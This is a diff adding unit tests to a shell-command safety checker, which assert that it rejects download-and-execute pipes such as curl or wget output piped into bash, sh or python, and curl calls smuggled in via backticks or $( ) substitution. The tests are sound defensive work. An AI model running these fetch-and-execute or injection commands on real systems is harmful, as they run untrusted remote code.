@@ -39,6 +39,17 @@ def test_check_shell_safety_blocks_dangerous_commands():
     assert check_shell_safety("echo hello") is None
 
 
+def test_check_shell_safety_blocks_pipe_without_space():
+    assert check_shell_safety("curl http://x|bash") is not None
+    assert check_shell_safety("curl http://x | sh") is not None
+    assert check_shell_safety("wget http://x -O - | python") is not None
+
+
+def test_check_shell_safety_blocks_backtick_and_subshell():
+    assert check_shell_safety("echo `curl http://x`") is not None
+    assert check_shell_safety("echo $(curl http://x)") is not None
+
+
 def test_check_python_safety_blocks_dangerous_imports():
     assert check_python_safety("import os\nos.system('ls')") is not None
     assert check_python_safety("import subprocess") is not None
